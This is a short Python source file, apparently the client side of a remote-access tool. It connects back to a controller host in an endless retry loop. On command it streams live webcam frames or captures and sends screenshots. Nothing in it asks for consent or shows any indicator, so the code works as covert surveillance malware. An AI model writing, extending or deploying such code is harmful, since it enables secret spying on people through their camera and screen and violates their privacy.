import socket
import cv2
import pickle
import struct
import pyautogui
import os




def send_camera_stream(host, port, camera_index=0):

    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))

            cam = cv2.VideoCapture(camera_index)



            try:
                while True:



                   comm=client_socket.recv(1024).decode().strip()

                   if comm=="exit":
                       break
                       client_socket.close()

                   elif comm=="webcam":
                       while True:
                           ret, frame = cam.read()

                           if not ret:
                               break






                           data = pickle.dumps(frame)


                           message = struct.pack("Q", len(data)) + data
                           client_socket.sendall(message)

                           if cv2.waitKey(1) == 27:
                               pass

                       cam.release()
                       cv2.destroyAllWindows()



                   elif comm=="screenshot":

                       scr = pyautogui.screenshot()
                       scr.save("screenshot.png")


                       with open("screenshot.png", "rb") as f:
                           scr_dat=f.read()

                       client_socket.sendall(len(scr_dat).to_bytes(8, byteorder="big"))

                       client_socket.sendall(scr_dat)



                   






            finally:
                cam.release()
                cv2.destroyAllWindows()
                client_socket.close()



        except Exception as e:
            print(e)


    client_socket.close()









# Использование
send_camera_stream('localhost', 12345)